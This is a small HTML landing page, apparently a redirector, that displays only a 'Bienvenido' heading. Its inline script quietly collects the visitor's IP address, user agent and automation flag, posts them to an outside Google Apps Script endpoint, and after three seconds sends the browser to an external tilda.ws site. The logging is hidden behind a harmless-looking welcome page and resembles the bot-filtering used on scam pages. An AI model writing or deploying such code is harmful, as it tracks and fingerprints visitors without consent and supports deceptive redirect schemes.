<body>
  <h1 style="text-align:center;margin-top:20%;">Bienvenido</h1>

  <script>
    (async () => {
      const ua = navigator.userAgent || '';
      const webdriver = navigator.webdriver ? '1' : '0';

      // IP-запрос
      let ip = '_';
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const json = await res.json();
        ip = json.ip;
      } catch (e) {}

      // Отправка лога (если нужно)
      fetch("https://script.google.com/macros/s/AKfycbxTdOYf8RqR0Nn11OnsdnCpcryYBAPQiTkPnLwSjwg0QayMiVWOJiJ84OCkk2kViovhlQ/exec", {
        method: "POST",
        body: JSON.stringify({
          ip,
          ua,
          webdriver,
          result: "ok"
        }),
      });

      // ⏱ редирект через 3 секунды
      setTimeout(() => {
        window.location.href = "http://argentinaforreal.tilda.ws/";
      }, 3000);
    })();
  </script>
</body>
